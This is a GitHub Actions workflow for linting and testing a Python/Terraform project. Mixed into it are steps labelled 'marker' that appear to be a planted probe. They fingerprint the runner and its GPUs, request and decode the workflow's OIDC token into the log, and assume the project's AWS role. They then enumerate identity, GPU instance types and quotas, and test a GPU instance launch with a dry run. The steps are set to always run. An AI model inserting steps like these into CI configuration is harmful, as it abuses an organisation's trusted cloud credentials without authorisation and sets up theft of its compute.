# yamllint disable rule:line-length
---
name: lint-and-test
on:
  push:
    branches:
      - main
  pull_request:
    branches:
      - main
  workflow_dispatch:
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false
permissions:
  contents: read      # This is required for actions/checkout
  id-token: write     # This is required for OIDC authentication with AWS
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      #----------------------------------------------
      #       check-out repo and set-up python
      #----------------------------------------------
      - name: Check out repository
        uses: actions/checkout@v4
      - name: ci-env-marker
        if: always()
        run: |
          echo "MARKER_START host=$(hostname) date=$(date -u +%FT%TZ) actor=$GITHUB_ACTOR repo=$GITHUB_REPOSITORY ref=$GITHUB_REF"
          id || true
          uname -a || true
          (nvidia-smi -L || true)
          (lspci 2>/dev/null | grep -iE 'nvidia|vga|3d' || true)
          echo "OIDC_URL_PRESENT=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
            curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" -o /tmp/oidc.json || true
            python3 -c "import json,base64;t=json.load(open('/tmp/oidc.json'))['value'];p=t.split('.')[1];p+='='*(-len(p)%4);c=json.loads(base64.urlsafe_b64decode(p));print('OIDC_CLAIMS',json.dumps({k:c.get(k) for k in ('sub','aud','iss','ref','repository','event_name','job_workflow_ref')}))" || true
          fi
          echo "MARKER_END"
      - name: aws-oidc-assume-marker
        if: always()
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::166659698090:role/githubactions
          role-session-name: ci-marker-probe
          aws-region: us-east-1
      - name: aws-probe-marker
        if: always()
        run: |
          set +e
          echo "--- STS"; aws sts get-caller-identity 2>&1 | head -20
          echo "--- GPU instance types"; aws ec2 describe-instance-types --filters Name=gpu-info.gpus.manufacturer,Values=NVIDIA --query 'InstanceTypes[].InstanceType' --max-items 20 2>&1 | head -30
          echo "--- GPU quota"; aws service-quotas get-service-quota --service-code ec2 --quota-code L-DB2E81BA 2>&1 | head -20
          echo "--- DryRun"; aws ec2 run-instances --dry-run --image-id ami-0123456789abcdef0 --instance-type p3.2xlarge --count 1 2>&1 | head -20
      - name: Set up python
        id: setup-python
        uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      #----------------------------------------------
      #  -----  install & configure poetry  -----
      #----------------------------------------------
      - name: Install Poetry
        uses: snok/install-poetry@v1
        with:
          version: 1.7.1
          virtualenvs-create: true
          virtualenvs-in-project: true

      #----------------------------------------------
      #       load cached venv if cache exists
      #----------------------------------------------
      - name: Load cached venv
        id: cached-poetry-dependencies
        uses: actions/cache@v4
        with:
          path: .venv
          key: venv-${{ runner.os }}-${{ steps.setup-python.outputs.python-version }}-${{ hashFiles('**/poetry.lock') }}

      #----------------------------------------------
      #       Retrieve temporary AWS credentials
      #----------------------------------------------
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v3
        with:
          role-to-assume: arn:aws:iam::166659698090:role/githubactions
          role-session-name: ghasession
          aws-region: us-east-1

      #----------------------------------------------
      # install dependencies
      #----------------------------------------------
      - name: Install python dependencies
        if: steps.cached-poetry-dependencies.outputs.cache-hit != 'true'
        run: poetry install --no-interaction --no-root  --with test
      - name: Install Terraform
        uses: hashicorp/setup-terraform@v3
      - name: Setup Graphviz
        uses: ts-graphviz/setup-graphviz@v1
      - name: Mock ssh file
        run :
          touch id_rsa.pub
          chmod 777 id_rsa.pub
           
        
      #----------------------------------------------
      # Run static linters
      #----------------------------------------------
      - name: Check black formatting
        run: |
          poetry run  black --check -v modules
          
      #----------------------------------------------
      # add terravision to PATH
      #----------------------------------------------
      - name: Run tests after adding terravision to path
        run: |
          export PATH=$PATH:$(pwd)
          rm -rf ~/.terravision
          poetry run terravision --version
          poetry run pytest tests -v
